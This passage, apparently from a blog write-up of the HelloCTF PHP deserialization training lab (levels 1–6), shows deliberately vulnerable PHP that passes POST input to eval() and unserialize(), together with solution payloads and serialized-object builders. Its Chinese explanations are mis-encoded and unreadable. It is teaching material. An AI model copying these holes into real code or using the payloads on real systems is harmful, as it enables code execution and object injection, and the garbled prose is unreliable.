hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag_string</span> = <span class="string">&quot;HelloCTF&#123;ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;flag_string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p>å®ä¾‹åŒ–æµ‹è¯•ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¼šä½œä¸ºphpä»£ç æ‰§è¡Œï¼ŒPOSTä¼ å…¥<code>code=$a=new FLAG;</code>è·å–flag</p><p>è¿™é‡Œæœ‰<code>__construct()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬ä¼ å…¥çš„æŒ‡ä»¤å®ä¾‹åŒ–æ—¶ä¼šè‡ªåŠ¨æ‰“å°å±æ€§<code>$flag_string</code>å€¼</p><br /><h3 id="Level-2-å¯¹è±¡ä¸­å€¼çš„ä¼ é€’"><a href="#Level-2-å¯¹è±¡ä¸­å€¼çš„ä¼ é€’" class="headerlink" title="Level 2: å¯¹è±¡ä¸­å€¼çš„ä¼ é€’"></a>Level 2: å¯¹è±¡ä¸­å€¼çš„ä¼ é€’</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 2 : ç±»å€¼çš„ä¼ é€’ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šå°è¯•å°†flagä¼ é€’å‡ºæ¥~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$flag_string</span> = <span class="string">&quot;HelloCTF&#123;ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&#125;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$free_flag</span> = <span class="string">&quot;???&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">get_free_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;free_flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">       <span class="variable">$target</span>-&gt;<span class="title function_ invoke__">get_free_flag</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°è¯•å°†<code>$flag_string</code>çš„å€¼ä¼ é€’åˆ°<code>$free_flag</code>ä¸­ï¼Œ<code>$free_flag</code>æ˜¯å…¬å…±å±æ€§ï¼Œå¯ä»¥ç›´æ¥å¤èµ‹å€¼ï¼Œé¢˜ç›®ä¼šè°ƒç”¨<code>get_free_flag</code>æ–¹æ³•æ‰“å°<code>$target-&gt;free_flag</code>çš„å€¼</p><p>ä¼ é€’<code>code=$target-&gt;free_flag=$flag_string;</code>è·å¾—flag</p><br /><h3 id="Level-3-å¯¹è±¡ä¸­å€¼çš„æƒé™"><a href="#Level-3-å¯¹è±¡ä¸­å€¼çš„æƒé™" class="headerlink" title="Level 3: å¯¹è±¡ä¸­å€¼çš„æƒé™"></a>Level 3: å¯¹è±¡ä¸­å€¼çš„æƒé™</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 3 : å¯¹è±¡ä¸­å€¼çš„æƒé™ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šå°è¯•å°†flagä¼ é€’å‡ºæ¥~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$public_flag</span> = <span class="string">&quot;HelloCTF&#123;?&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_flag</span> = <span class="string">&quot;?&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_flag</span> = <span class="string">&quot;?&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_protected_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_private_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubFLAG</span> <span class="keyword">extends</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_protected_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_private_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="variable">$sub_target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SubFLAG</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Trying to get FLAG...&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Public Flag: &quot;</span>.<span class="variable">$target</span>-&gt;public_flag.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Protected Flag:&quot;</span>.<span class="variable">$target</span>-&gt;protected_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Private Flag:&quot;</span>.<span class="variable">$target</span>-&gt;private_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿå¯¹è±¡å±æ€§çš„æƒé™ï¼Œä¸èƒ½ç›´æ¥å°†protectedå’Œprivateçš„å±æ€§ç›´æ¥echoå‡ºæ¥ï¼Œæ€è·¯æ˜¯éœ€è¦åˆ©ç”¨ç±»å†…çš„æ–¹æ³•è¿”å›å‡ºæ¥ï¼Œä¼ é€’ï¼š</p><p><code>code=echo $target-&gt;public_flag.$target-&gt;get_protected_flag().$target-&gt;get_private_flag();</code></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨<code>sub_target</code>ç±»ä¸­çš„<code>show_protected_flag()</code>æ–¹æ³•è·å¾—<code>$protected_flag</code>,ä½†æ˜¯ä¸èƒ½ç±»ä¼¼åœ°è·å¾—<code>$private_flag</code>ï¼Œå› ä¸ºprivateä¿®é¥°çš„å±æ€§ç”šè‡³ä¸èƒ½åœ¨å­ç±»ä¸­è®¿é—®</p><br /><h3 id="Level-4-åºåˆ—åŒ–åˆä½“éªŒ"><a href="#Level-4-åºåˆ—åŒ–åˆä½“éªŒ" class="headerlink" title="Level 4: åºåˆ—åŒ–åˆä½“éªŒ"></a>Level 4: åºåˆ—åŒ–åˆä½“éªŒ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 4 : åºåˆ—åŒ– --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šå—¯ï¼ï¼Ÿå…¨æ˜¯ç§æœ‰ï¼Œæ€ä¹ˆè·å–flagå‘¢ï¼Ÿè¯•è¯•åºåˆ—åŒ–ï¼</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG3</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag3_object_array</span> = <span class="keyword">array</span>(<span class="string">&quot;ï¼Ÿ&quot;</span>,<span class="string">&quot;ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag1_string</span> = <span class="string">&quot;ï¼Ÿ&quot;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag2_number</span> = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag3_object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag3_object = <span class="keyword">new</span> <span class="title class_">FLAG3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag_is_here</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–ä¼šå°†ç±»çš„æ‰€æœ‰å±æ€§ï¼ˆåŒ…æ‹¬ä¿®é¥°å±æ€§ï¼‰åºåˆ—åŒ–ï¼Œç›´æ¥ä¼ é€’<code>code=echo serialize($flag_is_here);</code>è·å¾—flagï¼Œæƒ³è¦æ›´æ¸…æ™°åœ°çœ‹å‡ºflagæ ¼å¼å¯ä»¥ç”¨ä¸€äº›ç›´æ¥æ‰“å°å¯¹è±¡çš„å‡½æ•°</p><p><strong>èƒ½å¤Ÿæ¸…æ™°åœ°æ‰“å°å‡ºå¯¹è±¡çš„å‡½æ•°ï¼š</strong></p><p><code>var_dump()</code>ã€<code>print_r()</code>ã€<code>var_export()</code></p><br /><h3 id="Level-5-åºåˆ—åŒ–çš„æ™®é€šå€¼è§„åˆ™"><a href="#Level-5-åºåˆ—åŒ–çš„æ™®é€šå€¼è§„åˆ™" class="headerlink" title="Level 5: åºåˆ—åŒ–çš„æ™®é€šå€¼è§„åˆ™"></a>Level 5: åºåˆ—åŒ–çš„æ™®é€šå€¼è§„åˆ™</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 5 : åºåˆ—åŒ–è§„åˆ™ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šå„æœ‰åƒç§‹~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a_class</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a_value</span> = <span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a_class</span>();</span><br><span class="line"><span class="variable">$a_array</span> = <span class="keyword">array</span>(a=&gt;<span class="string">&quot;Hello&quot;</span>,b=&gt;<span class="string">&quot;CTF&quot;</span>);</span><br><span class="line"><span class="variable">$a_string</span> = <span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line"><span class="variable">$a_number</span> = <span class="number">678470</span>;</span><br><span class="line"><span class="variable">$a_boolean</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a_null</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">See How to serialize:</span><br><span class="line">a_object: O:<span class="number">7</span>:<span class="string">&quot;a_class&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;a_value&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;HelloCTF&quot;</span>;&#125;</span><br><span class="line">a_array: a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;&#125;</span><br><span class="line">a_string: s:<span class="number">8</span>:<span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line">a_number: i:<span class="number">678470</span>;</span><br><span class="line">a_boolean: b:<span class="number">1</span>;</span><br><span class="line">a_null: N;</span><br><span class="line">Now your turn!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$your_object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_array</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_string</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_number</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;i&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_boolean</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_NULL</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;n&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">    <span class="variable">$your_boolean</span> &amp;&amp; </span><br><span class="line">    <span class="variable">$your_NULL</span> == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_string</span> == <span class="string">&quot;IWANT&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_number</span> == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_object</span>-&gt;a_value == <span class="string">&quot;FLAG&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_array</span>[<span class="string">&#x27;a&#x27;</span>] == <span class="string">&quot;Plz&quot;</span> &amp;&amp; <span class="variable">$your_array</span>[<span class="string">&#x27;b&#x27;</span>] == <span class="string">&quot;Give_M3&quot;</span></span><br><span class="line">)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You really know how to serialize?&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦å°†ç¬¦åˆé¢˜ç›®æ¡ä»¶çš„å‚æ•°è¿›è¡Œåºåˆ—åŒ–åä¼ é€’ï¼Œå°±å¯ä»¥è·å¾—flagï¼Œæ„é€ å‚æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a_class</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a_value</span> = <span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$your_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a_class</span>();</span><br><span class="line"><span class="variable">$your_object</span>-&gt;a_value = <span class="string">&quot;FLAG&quot;</span>;</span><br><span class="line"><span class="variable">$your_array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&quot;Plz&quot;</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="string">&quot;Give_M3&quot;</span>);</span><br><span class="line"><span class="variable">$your_string</span> = <span class="string">&quot;IWANT&quot;</span>;</span><br><span class="line"><span class="variable">$your_number</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$your_boolean</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$your_NULL</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;o=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_object</span>).<span class="string">&quot;&amp;a=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_array</span>).<span class="string">&quot;&amp;s=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_string</span>).<span class="string">&quot;&amp;i=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_number</span>).<span class="string">&quot;&amp;b=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_boolean</span>).<span class="string">&quot;&amp;n=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_NULL</span>).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä¼ é€’<code>o=O:7:&quot;a_class&quot;:1:{s:7:&quot;a_value&quot;;s:4:&quot;FLAG&quot;;}&amp;</code></p><p><code>a=a:2:{s:1:&quot;a&quot;;s:3:&quot;Plz&quot;;s:1:&quot;b&quot;;s:7:&quot;Give_M3&quot;;}&amp;</code></p><p><code>s=s:5:&quot;IWANT&quot;;&amp;i=i:1;&amp;</code></p><p><code>b=b:1;&amp;</code></p><p><code>n=N;</code>è·å¾—flag</p><br /><h3 id="Level-6-åºåˆ—åŒ–çš„æƒé™ä¿®é¥°è§„åˆ™"><a href="#Level-6-åºåˆ—åŒ–çš„æƒé™ä¿®é¥°è§„åˆ™" class="headerlink" title="Level 6: åºåˆ—åŒ–çš„æƒé™ä¿®é¥°è§„åˆ™"></a>Level 6: åºåˆ—åŒ–çš„æƒé™ä¿®é¥°è§„åˆ™</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 6 : åºåˆ—åŒ–è§„åˆ™_æƒé™ä¿®é¥° --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šå„æœ‰åƒç§‹~ç‰¹åˆ«æ³¨æ„çš„æƒé™ä¿®é¥°ç¬¦x</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">protectedKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">privateKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">See Carfully~</span><br><span class="line"><span class="keyword">protected</span><span class="string">&#x27;s serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D</span></span><br><span class="line"><span class="string">private&#x27;</span>s serialize: O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>privateKEY%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>privateKEY%<span class="number">00</span>private_key%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$protected_key</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;protected_key&#x27;</span>]);</span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;private_key&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$protected_key</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$private_key</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$protected_key</span>-&gt;<span class="title function_ invoke__">get_key</span>() == <span class="string">&quot;protected_key&quot;</span> &amp;&amp; <span class="variable">$private_key</span>-&gt;<span class="title function_ invoke__">get_key</span>() == <span class="string">&quot;private_key&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;We Call it %00_Contr0l_Characters_NULL!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦è®©<code>$protected_key-&gt;get_key()</code>çš„å€¼ä¸º<code>&quot;protected_key&quot;</code>ï¼Œ<code>$private_key-&gt;get_key()</code>çš„å€¼ä¸º<code>&quot;private_key&quot;</code></p><p>æ„é€ å‚æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">protectedKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_key</span>=<span class="string">&quot;protected_key&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">privateKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_key</span>=<span class="string">&quot;private_key&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">protectedKEY</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">privateKEY</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;protected_key=&quot;</span>.<span class="title function_ 